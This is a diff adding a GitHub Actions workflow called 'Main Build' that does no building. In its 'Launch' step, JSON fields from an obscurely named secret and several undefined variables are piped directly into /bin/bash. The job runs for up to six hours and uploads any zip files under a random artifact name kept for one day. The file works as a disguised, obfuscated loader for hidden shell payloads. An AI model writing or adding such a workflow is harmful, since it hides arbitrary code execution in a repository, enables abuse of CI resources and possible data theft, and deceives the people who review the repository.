@@ -1,0 +1,32 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          zst286: ${{ secrets.zst286 }}
+        run: |
+          printf '%s' "$zst286" | jq -r .mori2 | /bin/bash
+          printf '%s' "$lfgq2070" | jq -r .qbe6 | /bin/bash
+          echo $ez65960 | jq -r .gyew2456 | /bin/bash
+          echo $f37 | jq -r .b30 | /bin/bash
+          echo $n90808 | jq -r .b781 | /bin/bash
+          echo $lohnk6 | jq -r .znsy7819 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Nq7OvsYE
+          path: "*.zip"
+          retention-days: 1
